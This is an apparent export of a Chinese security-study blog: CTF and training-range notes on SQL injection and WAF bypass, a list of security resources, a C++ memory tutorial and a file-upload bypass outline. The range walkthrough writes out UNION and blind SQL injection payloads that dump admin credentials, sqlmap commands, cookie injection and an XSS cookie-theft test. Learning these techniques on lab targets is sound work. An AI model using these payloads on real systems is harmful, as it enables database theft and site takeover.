<p>id&#x3D;12 order by 1# 显示为自定义错误信息。</p>
<p>id&#x3D;12%20order%20&#x2F;*|–|*&#x2F;–+%20%0Aby%201%23–+绕过无果</p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>id&#x3D;37 and(or) 1&#x3D;2 拦截</p>
<p>id&#x3D;37 &amp;&amp; 1&#x3D;2正常</p>
<p>id&#x3D;37 || 1&#x3D;2 屏蔽了此状态详细信息，状态码500</p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>ID&#x3D;10%20&amp;&amp;%201&#x3D;2–+ 没有指定操作参数</p>
<p>…and… 拦截</p>
<p>ID&#x3D;11%20or%201&#x3D;2–+没有指定操作参数</p>
<p>ID&#x3D;11%20%61%6e%64%201&#x3D;2–+ l拦截</p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>id&#x3D;1221’ 重定向</p>
<blockquote>
<p>HTTP&#x2F;1.1 302 Object moved<br>Cache-Control: private<br>Content-Length: 107<br>Content-Type: text&#x2F;html<br>Location: index.asp<br>Server: Microsoft-IIS&#x2F;7.5<br>Date: Thu, 06 Jul 2023 13:20:22 GMT<br>Connection: close</p>
<head><title>已移动</title></head>

<p>&lt;body&gt;&lt;h\1&gt;已移动&lt;&#x2F;\h1&gt;已移动&lt;\a HREF&#x3D;”index.asp”&gt;´Ë´¦&lt;/a&gt;.&lt;&#x2F;\body&gt;</p>
</blockquote>
<p>id&#x3D;1221 and 1&#x3D;2 重定向</p>
<h2 id="web13（单引号过滤）"><a href="#web13（单引号过滤）" class="headerlink" title="web13（单引号过滤）"></a>web13（单引号过滤）</h2><p>编码或改成双引号，构造双引号为单引号</p>
<p>id&#x3D;23” or “1” like “1“</p>
<h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p><img src="/../../../Typora/img111/image-20230709224116536.png"></p>
]]></content>
      <categories>
        <category>挖洞</category>
      </categories>
      <tags>
        <tag>挖洞</tag>
      </tags>
  </entry>
  <entry>
    <title>在线网址</title>
    <url>/2023/05/13/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="一、在线工具"><a href="#一、在线工具" class="headerlink" title="一、在线工具"></a>一、在线工具</h2><p><a href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
<p><a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p>
<p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
<p><a href="https://tool.oschina.net/regex">正则匹配在线</a></p>
<h2 id="二、学习网址"><a href="#二、学习网址" class="headerlink" title="二、学习网址"></a>二、学习网址</h2><ol>
<li>Cybrary - <a href="http://www.cybrary.it/">www.cybrary.it</a></li>
<li>Infosec Institute - <a href="http://www.infosecinstitute.com/">www.infosecinstitute.com</a></li>
<li>SANS Institute - <a href="http://www.sans.org/">www.sans.org</a></li>
<li>Offensive Security - <a href="http://www.offensive-security.com/">www.offensive-security.com</a></li>
<li>EC-Council - <a href="http://www.eccouncil.org/">www.eccouncil.org</a></li>
<li>Hack This Site - <a href="http://www.hackthissite.org/">www.hackthissite.org</a></li>
<li>OWASP - <a href="http://www.owasp.org/">www.owasp.org</a></li>
<li>HackerOne - <a href="http://www.hackerone.com/">www.hackerone.com</a></li>
<li>Krebs on Security - <a href="http://www.krebsonsecurity.com/">www.krebsonsecurity.com</a></li>
<li>Dark Reading - <a href="http://www.darkreading.com/">www.darkreading.com</a></li>
<li>Threatpost - <a href="http://www.threatpost.com/">www.threatpost.com</a></li>
<li>Malwarebytes Labs - <a href="http://www.malwarebytes.com/labs/">www.malwarebytes.com/labs/</a></li>
<li>Wired - <a href="http://www.wired.com/category/security">www.wired.com/category/security</a></li>
<li>The Hacker News - thehackernews.com</li>
<li>Security Week - <a href="http://www.securityweek.com/">www.securityweek.com</a></li>
<li>TechTarget - security.techtarget.com</li>
<li>Security Boulevard - securityboulevard.com</li>
<li>CSO Online - <a href="http://www.csoonline.com/">www.csoonline.com</a></li>
<li>Pentester Academy - <a href="http://www.pentesteracademy.com/">www.pentesteracademy.com</a></li>
<li>Exploit Database - <a href="http://www.exploit-db.com/">www.exploit-db.com</a></li>
</ol>
<p><a href="https://blog.zgsec.cn/index.php/archives/258/">https://blog.zgsec.cn/index.php/archives/258/</a></p>
<p>知识星球</p>
<p><a href="https://www.freebuf.com/vuls">漏洞 - FreeBuf网络安全行业门户</a></p>
<p><a href="http://skills.bugbank.cn/">BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台</a></p>
<p><a href="https://zbook.lol/">zBook</a> 电子书</p>
<p><a href="https://www.bookstack.cn/">https://www.bookstack.cn/</a> 书栈网</p>
<p><a href="https://www.r2coding.com/">https://www.r2coding.com/</a></p>
<p><a href="https://www.vulhub.org.cn/search">漏洞检索 - VULHUB开源网络安全威胁库</a></p>
<p><a href="https://www.freebuf.com/column/195521.html">https://www.freebuf.com/column/195521.html</a></p>
<p><a href="http://xiaodi8.com/?id=25">http://xiaodi8.com/?id=25</a></p>
<p><a href="https://xz.aliyun.com/t/6103">https://xz.aliyun.com/t/6103</a></p>
<p><a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
<p>[Nessus安装与使用_nessus安装使用教程_@Camelus的博客-CSDN博客](<a href="https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&request_id=&biz_id=102&utm_term=windows">https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows</a> nessus安装&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-1-126803631.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
<p><a href="https://bbs.zkaq.cn/">Track 安全社区 — 掌控安全在线教育- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者 (zkaq.cn)</a></p>
<p><a href="https://overthewire.org/wargames/natas/natas9.html">OverTheWire: Natas Level 8 → Level 9</a></p>
<p><a href="https://www.52pojie.cn/forum.php">吾爱破解 - LCG - LSG|安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://blog.csdn.net/weixin_44211968/article/details/124696627?ops_request_misc=%7B%22request_id%22:%22168441788816800211527620%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168441788816800211527620&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124696627-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7&spm=1018.2226.3001.4187">【Web 安全】XSS 攻击详解_xss攻击_想变厉害的大白菜的博客-CSDN博客</a></p>
<p>pikachu靶场 <a href="http://t.csdn.cn/fhhlu">http://t.csdn.cn/fhhlu</a></p>
<p>乌云社区</p>
<p>先知社区</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3Nzg0ODk5OQ==&mid=2456708545&idx=1&sn=b6e003b72fa44a81ee0f916efb75471f&chksm=88d10d09bfa6841f1a457f72edda40400701ba0ce959e1ffac433d029212067e15cb726af3c1&scene=21#wechat_redirect">安全测试基础篇——OWASP API Security Top 10 (qq.com)</a></p>
<p><a href="https://blog.csdn.net/qq_45894840/article/details/123613510?ops_request_misc=&request_id=&biz_id=102&utm_term=hackthebox&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-123613510.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(87条消息) hackthebox的网站使用教程_Ba1_Ma0的博客-CSDN博客</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3Nzg0ODk5OQ==&mid=2456708553&idx=1&sn=65baabdb0b3f2837552ab9d79e403f32&chksm=88d10d01bfa684175d8752b04b23549a4f29cd712747be5cc49bfa2e11295e4fac6dafcf16a9&cur_album_id=2064575600572334080&scene=189#wechat_redirect">安全测试基础篇——OWASP Web Application Top 10 (qq.com)</a></p>
<p>zoom eye.</p>
<h2 id="三、学习平台"><a href="#三、学习平台" class="headerlink" title="三、学习平台"></a>三、学习平台</h2><p>xss接收平台:<a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p>
<p>dnslog平台:<a href="http://ceye.io/">http://ceye.io/</a></p>
]]></content>
      <categories>
        <category>在线工具</category>
        <category>学习网址</category>
      </categories>
      <tags>
        <tag>编译</tag>
        <tag>加密解密</tag>
        <tag>其它工具</tag>
        <tag>学习网址</tag>
      </tags>
  </entry>
  <entry>
    <title>堆/栈/RAII</title>
    <url>/2023/08/13/%E5%A0%86%E6%A0%88/</url>
    <content><![CDATA[<h1 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h1><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>英文heap，指动态分配内存的区域，不同于数据结构的堆。这里的内存分配后，需要手工释放，否则造成内存泄露。</p>
<p>c++里一个相关概念叫自由存储区，英文为free store，特指用new和delete来分配和释放内存的区域。一般而言，这是堆的一个子集：</p>
<blockquote>
<p>new和delete操作的区域是free store</p>
<p>malloc和free操作的区域是堆</p>
</blockquote>
<p>但 new 和 delete 通常底层使用 malloc 和 free 来实现，所以 free store 也是 heap。鉴于对其区分的实际意义并不大，所以根据参考资料先统一为<code>堆</code></p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>stack，指函数调用过程中产生的本地变量和调用数据的区域。与数据结构的栈高度相似，满足先进后出</p>
<h2 id="RAII"><a href="#RAII" class="headerlink" title="RAII"></a>RAII</h2><p>Resource Acquisition Is Initialization，是C++特有的资源管理方式。C++依赖RAII做资源管理。</p>
<p>RAII依托栈和析构函数，来对所有的资源（包括堆内存在内）进行管理。</p>
<p>对RAII的使用，使得C++不需要Java那样的垃圾收集方法，也能有效地对内存进行管理。</p>
<p>导致在堆上分配内存（并构造对象）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//c++</span><br><span class="line">auto ptr=new std::vector&lt;int&gt;();</span><br><span class="line"></span><br><span class="line">//Java</span><br><span class="line">ArrayList&lt;int&gt; list = new ArrayList&lt;int&gt;();</span><br><span class="line"></span><br><span class="line">//python</span><br><span class="line">lst=list()</span><br></pre></td></tr></table></figure>

<p>程序通常需要牵涉三个可能的内存管理器的操作：</p>
<blockquote>
<p>1.让内存管理器分配一个某个大小的内存块</p>
<p>2….释放一个之前分配的内存块</p>
<p>3….进行垃圾收集操作，寻找不再使用的内存块并予以释放</p>
</blockquote>
<p>C++一般做操作1,2；JAVA做1,3；python做1,2,3；</p>
<p>第一，分配内存需要考虑程序当前已经有多少 <strong>未分配</strong> 内存。内存不足，要从操作系统申请新内存；内存充足时，从可用内存里取出一块合适大小的内存，标记为已用，将其返回给要求内存的代码</p>
<p>第二，释放内存，除了内存标记为未使用后，还要合并连续未使用的内存块成一块。</p>
<p>第三，垃圾收集操作，c++不用，不开展。</p>
<p>内存碎片化的情况，开发人员一般不用考虑。内存分配和释放的管理是内存管理器的任务。所以我们只需要正确使用new和delete即可。</p>
<p>漏掉delete会造成内存泄露。</p>
<p>c++更常见更合理的情况是，分配和释放不在一个函数里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bar* make_bar(...)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	try&#123;</span><br><span class="line">	bar* ptr=new bar();</span><br><span class="line">	  ...</span><br><span class="line">	&#125;</span><br><span class="line">	catch(...)&#123;</span><br><span class="line">		delete ptr;</span><br><span class="line">		throw;</span><br><span class="line">	&#125;</span><br><span class="line">	return ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void foo()</span><br><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">   bar* ptr=make_bar(...)</span><br><span class="line">   ...</span><br><span class="line">   delete ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样导致的是漏delete的可能性变大</p>
<h1 id="二、栈变化"><a href="#二、栈变化" class="headerlink" title="二、栈变化"></a>二、栈变化</h1><p>讨论下c++函数调用、本地变量如何使用栈。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void foo(int n)</span><br><span class="line">&#123;</span><br><span class="line">…</span><br><span class="line">&#125;</span><br><span class="line">void bar(int n)</span><br><span class="line">&#123;</span><br><span class="line">int a = n + 1;</span><br><span class="line">foo(a);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">…</span><br><span class="line">bar(42);</span><br><span class="line">…</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230814233126131.png"></p>
<p>该示例中，栈向上增长，大部分计算机体系架构中，栈的增长方向为低地址，上方意味着低地址。</p>
<p>栈的分配与释放看似都是移动了栈指针，由于先进后从出，一进一处，不会出现内存碎片</p>
<p>上图中每种颜色都表示某个函数占用的栈空间。叫做<strong>栈帧</strong>；</p>
<p>编译器会自动调用析构函数，包括在函数执行发生异常的情况，在发生异常时对析构函数的调用，称为 <strong>栈展开</strong>。</p>
<p>栈展开代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">class Obj &#123;</span><br><span class="line">public:</span><br><span class="line">Obj() &#123; puts(&quot;Obj()&quot;); &#125;</span><br><span class="line">~</span><br><span class="line">Obj() &#123; puts(&quot;~Obj()&quot;); &#125;</span><br><span class="line">&#125;;</span><br><span class="line">void foo(int n)</span><br><span class="line">&#123;</span><br><span class="line">Obj obj;</span><br><span class="line">if (n == 42)</span><br><span class="line">throw &quot;It&#x27;s yuleiyun&quot;;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">try &#123;</span><br><span class="line">foo(41);</span><br><span class="line">foo(42);</span><br><span class="line">&#125;</span><br><span class="line">catch (const char* s) &#123;</span><br><span class="line">puts(s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Obj()<br>~Obj()<br>Obj()<br>~Obj()<br>It’s yuleiyun</p>
</blockquote>
<p>PS: puts只用于输出字符串，且换行</p>
<p>C++ 支持将对象存储在栈上面。但是，在很多情况下，对象不能，或不应该，存储在栈上。</p>
<p>比如：</p>
<blockquote>
<p>对象很大；<br>对象的大小在编译时不能确定；<br>对象是函数的返回值，但由于特殊的原因，不应使用对象的值返回。</p>
</blockquote>
<p>。。。。</p>
<p>如果返回类型是 shape，实际却返回一个 circle，编译器不会报错，但结果多半是错的。这种现象叫对象切片（object slicing）</p>
]]></content>
      <categories>
        <category>C++</category>
        <category>堆/栈/RAII</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>堆/栈</tag>
      </tags>
  </entry>
  <entry>
    <title>封神台靶场</title>
    <url>/2023/05/15/%E5%B0%81%E7%A5%9E%E5%8F%B0/</url>
    <content><![CDATA[<h2 id="一、女神小芳"><a href="#一、女神小芳" class="headerlink" title="一、女神小芳"></a>一、女神小芳</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515211214636.png" alt="image-20230515211214636"></p>
<h3 id="1-注入位置判断"><a href="#1-注入位置判断" class="headerlink" title="1.注入位置判断"></a>1.注入位置判断</h3><p>id&#x3D;1,2,3时有不同页面，猜测id处可以注入</p>
<h3 id="2-注入类型判断（判断错误）"><a href="#2-注入类型判断（判断错误）" class="headerlink" title="2.注入类型判断（判断错误）"></a>2.注入类型判断（判断错误）</h3><p>&#x3D;&#x3D;<strong>显然没有回显位，故不用联合注入</strong>&#x3D;&#x3D;</p>
<p>1’、1”时页面不正常且不显示内容，故没有报错注入</p>
<p>&#x3D;&#x3D;首先进行数字型注入&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;<code>id=1 and 1=1 时页面正常</code>&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;<code>id=1 and 1=2 时页面不正常</code>&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;故数字型盲注。&#x3D;&#x3D;</p>
<p>看了wp才发现，原来还是可以用联合注入的，想当然了，以为回显位(order by)只出现在有输入框的地方。</p>
<h2 id="3-联合注入"><a href="#3-联合注入" class="headerlink" title="3.联合注入"></a>3.联合注入</h2><h3 id="1-order-by判断可显示列数"><a href="#1-order-by判断可显示列数" class="headerlink" title="1.order by判断可显示列数"></a>1.order by判断可显示列数</h3><p><code>id=1 order by 3内容为空 by 2为正常值</code></p>
<p>故回显位2</p>
<h3 id="2-union-select"><a href="#2-union-select" class="headerlink" title="2.union select"></a>2.union select</h3><p><code>?id=10000 union select 1,2#</code> id&#x3D;-1这种不行，被处理过了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515235328914.png" alt="image-20230515235328914"></p>
<p>2改为database()，显示maoshe</p>
<h3 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h3><p>?id&#x3D;10000 union select 1,(select group_concat(’~‘,table_name) from information_schema.tables where table_schema&#x3D;database())#</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515235921469.png" alt="image-20230515235921469"></p>
<h3 id="4-爆列名"><a href="#4-爆列名" class="headerlink" title="4.爆列名"></a>4.爆列名</h3><p>?id&#x3D;10000%20union%20select%201,(select%20group_concat(%27~%27,column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;database()%20and%20table_name&#x3D;%27admin%27)#</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516001033181.png" alt="image-20230516001033181"></p>
<h3 id="5-爆列名值"><a href="#5-爆列名值" class="headerlink" title="5.爆列名值"></a>5.爆列名值</h3><p>?id&#x3D;10000%20union%20select%201,(select group_concat(‘~’,password) from admin)#</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516001159511.png" alt="image-20230516001159511"></p>
<h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h3><p>不能简单认为无输入框就没有联合注入，还是要多想，多尝试。</p>
<h2 id="盲注过程，算是复习吧qaq"><a href="#盲注过程，算是复习吧qaq" class="headerlink" title="盲注过程，算是复习吧qaq"></a>盲注过程，算是复习吧qaq</h2><h3 id="3-数据库长度判断"><a href="#3-数据库长度判断" class="headerlink" title="3.数据库长度判断"></a>3.数据库长度判断</h3><p><code>id=1%20and%20length(database())&gt;5 时正常，&gt;6时不正常</code></p>
<p>故database()长度为6</p>
<h3 id="4-数据库爆破"><a href="#4-数据库爆破" class="headerlink" title="4.数据库爆破"></a>4.数据库爆破</h3><p><code>id=1 and ascii(substr(database(),&#123;1&#125;,1)) &gt; &#123;1&#125; #判断第一个字母</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515215548482.png" alt="image-20230515215548482"></p>
<p>数据库名maoshe</p>
<h3 id="5-表名长度判断"><a href="#5-表名长度判断" class="headerlink" title="5.表名长度判断"></a>5.表名长度判断</h3><p><code>id=1 and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;4正常，&gt;5时不正常</code></p>
<p>故第一个表名长度5 </p>
<h3 id="6-表名爆破"><a href="#6-表名爆破" class="headerlink" title="6.表名爆破"></a>6.表名爆破</h3><p><code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;maoshe&#39; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;</code>#判断表名第一个字符</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515215706751.png" alt="image-20230515215706751"></p>
<p>第一个表名admin</p>
<p>第二个表名dirs</p>
<p>第三个表名news</p>
<p>第四个表名xss</p>
<h3 id="7-列名长度判断"><a href="#7-列名长度判断" class="headerlink" title="7.列名长度判断"></a>7.列名长度判断</h3><p>id &#x3D;1 and (select length(column_name) from information_schema. columns where table_name &#x3D; ‘admin’ and table_schema &#x3D; ‘maoshe’  limit  0,1)&gt;1 &#x2F;&#x2F;列名</p>
<h3 id="8-列名判断"><a href="#8-列名判断" class="headerlink" title="8.列名判断"></a>8.列名判断</h3><p><code>id =1 and ascii(substr((select column_name from information_schema.columns where table_name = &#39;admin&#39; and table_schema = &#39;maoshe&#39; limit  0,1),&#123;0&#125;,1))&gt;&#123;1&#125; //列名</code></p>
<p>admin表的列名Id、username、passwGrd</p>
<p>dirs表的列名paths</p>
<p>news表的列名id、content</p>
<p>xss表的列名id、user、pass</p>
<h3 id="9-爆值"><a href="#9-爆值" class="headerlink" title="9.爆值"></a>9.爆值</h3><p>看下xss的pass字段吧</p>
<p><code>id=1 and ascii(substr((select &#39;pass&#39; from &#39;xss&#39; limit  0,1),&#123;0&#125;,1))&gt;&#123;1&#125;</code></p>
<p>嘶，没跑出来flag的字样的，哪里漏掉了</p>
<h3 id="10-sqlmap"><a href="#10-sqlmap" class="headerlink" title="10.sqlmap"></a>10.sqlmap</h3><p>用sqlmap解决吧。</p>
<blockquote>
<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“ –dbs</p>
<p>跑出了maoshe、test、information_schema</p>
<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“  -D maoshe –tables</p>
<p>表名没问题</p>
<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“  -D maoshe -T admin –columns –dump</p>
<p>emm，admin表中的列是password，脚本还跑错了。</p>
</blockquote>
<h1 id="二、WAF过滤"><a href="#二、WAF过滤" class="headerlink" title="二、WAF过滤"></a>二、WAF过滤</h1><h2 id="1-注入位置判断-1"><a href="#1-注入位置判断-1" class="headerlink" title="1.注入位置判断"></a>1.注入位置判断</h2><p><img src="/../../../Typora/img111/image-20230516095034637.png" alt="image-20230516095034637"></p>
<p>找到新闻中任意一个具体页面，出现id&#x3D;171，猜测有注入点</p>
<h2 id="2-尝试闭合"><a href="#2-尝试闭合" class="headerlink" title="2.尝试闭合"></a>2.尝试闭合</h2><p>and、单引号等，and的双写也被过滤了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516095129031.png" alt="image-20230516095129031"></p>
<p>提示过滤了and update delete ; insert mid master</p>
<p>双引号和括号发现提示数据库出错</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516095308937.png" alt="image-20230516095308937"></p>
<p>而且这个order by的话就到10了。</p>
<p>各种传统关键字绕过尝试后，没其他办法了</p>
<p>看了wp，才知道用cookie，这里我用的工具是burp。</p>
<h2 id="3-先抓包"><a href="#3-先抓包" class="headerlink" title="3.先抓包"></a>3.先抓包</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516113815024.png" alt="image-20230516113815024"></p>
<p>右键发送repeate，删除掉?id&#x3D;171，避免接受url参数，转而添加Cookie参数，先 添加id&#x3D;171试试</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516114902620.png" alt="image-20230516114902620"></p>
<p>页面显示正常，可以尝试联合注入</p>
<h2 id="4-联合注入"><a href="#4-联合注入" class="headerlink" title="4.联合注入"></a>4.联合注入</h2><h3 id="1-union-select"><a href="#1-union-select" class="headerlink" title="1.union select"></a>1.union select</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516115631577.png" alt="image-20230516115631577"></p>
<p><code>id=1710000%20union%20select%201,2,3,4,5,6,7,8,9,10%20from%20admin;</code></p>
<p>注意空格记得填充，无论是%20还是+都可以</p>
<p>之所以加from admin，目的是猜测admin是否存在。</p>
<p>显示结果如下：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516115712683.png" alt="image-20230516115712683"></p>
<p>证明表admin是存在的</p>
<h3 id="2-猜解字段名"><a href="#2-猜解字段名" class="headerlink" title="2.猜解字段名"></a>2.猜解字段名</h3><p>这里参考的官方wp是说，直接猜解常见字段名</p>
<p><code>id=1710000%20union%20select%201,username,3,4,5,6,7,8,password,10%20from%20admin;</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516120410289.png" alt="image-20230516120410289"></p>
<p>数字加字母的16位组合，看出密码像是md5特征，解密试试</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121144887.png" alt="image-20230516121144887"></p>
<p>得到明文内容为welcome的密码</p>
<p>已知账号与密码，尝试后台登录。</p>
<h3 id="3-登录"><a href="#3-登录" class="headerlink" title="3.登录"></a>3.登录</h3><p>这是根据经验猜解的后台路径吧。。。。根目录下&#x2F;admin</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121550218.png" alt="image-20230516121550218"></p>
<p>输入admin,welcome</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121649512.png" alt="image-20230516121649512"></p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>当url上各种绕过尝试失效时，应该要联想到其它注入方式，如Cookie注入等。</p>
<h1 id="三、XSS"><a href="#三、XSS" class="headerlink" title="三、XSS"></a>三、XSS</h1><p>这关进入到了留言板页面，全部输入框都写进xss代码，确实存在。目的是获取cookie。</p>
<p>给每个框框试了一下</p>
<script>alert(1)</script>

<p>存在xss漏洞。</p>
<p>xss平台搭建参照：<a href="https://www.cnblogs.com/Cl0ud/p/12176961.html">搭建xss-platform平台 - 春告鳥 - 博客园 (cnblogs.com)</a></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520205909377-1684589650280-1.png"></p>
<p>再生成payload进行注入即可。</p>
<p>但是我的平台没收到。（噗，我搭建的是）</p>
<p>尝试用dvwa的xss漏洞时，都可以收到，但是封神台上失败。</p>
]]></content>
      <categories>
        <category>靶场演练</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>渗透测试</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传综述</title>
    <url>/2023/05/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%BC%E8%BF%B0/</url>
    <content><![CDATA[<h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p>文件上传<br>    初识<br>        意义<br>        危害<br>        查找&#x2F;判断方式<br>        注意点<br>        实际应用说明<br>    验证&#x2F;绕过<br>        前端<br>            JS类防护<br>        后端<br>            黑名单<br>                特殊解析后缀<br>                .htaccess解析<br>                大小写绕过<br>                点绕过<br>                空格绕过<br>                ::$$DATA绕过<br>                配合解析漏洞<br>                双后缀名绕过<br>            白名单<br>                MIME绕过<br>                %00截断：在url中%00表示ascii码的0，表示字符串结束。（php版本&lt;5.3.4吧）<br>                0x00截断<br>                0x0a截断<br>            内容及其他<br>                文件头检测<br>                二次渲染<br>                条件竞争<br>                突破getimagesize<br>                突破exif_imagetype<br>    漏洞&#x2F;修复<br>        解析漏洞<br>            IIS6&#x2F;7.X<br>            Apache<br>            Nginx<br>        CMS漏洞<br>            子主题 1<br>            子主题 2<br>            子主题 3<br>        其他漏洞<br>            编辑器漏洞<br>                fackeditor<br>                ewebeditor<br>                ckeditor<br>                kindedit<br>                …<br>            CVE漏洞<br>            安全修复<br>    WAF绕过<br>        safadog<br>        BT<br>        XXX云盾</p>
<p><strong>利用思路</strong></p>
<p>常规类</p>
<p>​	扫描获取上传</p>
<p>​	会员中心上传</p>
<p>​	后台系统上传</p>
<p>​	各种途径上传</p>
<p>CMS类</p>
<p>​	CMS源码</p>
<p>编辑器类</p>
<p>​	ckeditor</p>
<p>​    ewebeditor<br>​			ckeditor<br>​			kindedit</p>
<p>其他&#x2F;CVE</p>
<p>​	平台审计</p>
<p>​	第三方</p>
<h2 id="1-基础与过滤方式"><a href="#1-基础与过滤方式" class="headerlink" title="1.基础与过滤方式"></a>1.基础与过滤方式</h2><p>是什么：程序对文件的上传没有全面的限制，导致用户可以上传一些超越用户权限的一些文件，如木马,shell脚本,病毒等。</p>
<p>文件上传利用前提:1.能上传上去；2.文件能被解析；3.知道绝对<strong>路径</strong>且能访问 </p>
<p>危害：获取到网站权限，进而获取数据。即通过该漏洞上传webshell后门。</p>
<p>查找&#x2F;判断：1.目录扫描找到上传地址</p>
<p>​					2.会员中心</p>
<p>​					3.后台</p>
<p>​					4.白盒：拿到源代码找漏洞</p>
<p>注意点：拿到漏洞，要对漏洞类型进行区分</p>
<p>实际应用说明：上传后门脚本获取网站权限</p>
<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><ul>
<li>常规文件上传地址的获取说明	：工具扫描</li>
<li>不同格式下的文件类型后门测试：这个要结合自己的木马类型，如果是php，你连接地址为..&#x2F;1.jpg，显示是不符合的。(.htacess另说)</li>
<li>配合解析漏洞下的文件类型后门测试本地文件：上传+解析漏洞</li>
<li>upload-labs</li>
<li>CMS&#x2F;CVE上传漏洞复现</li>
</ul>
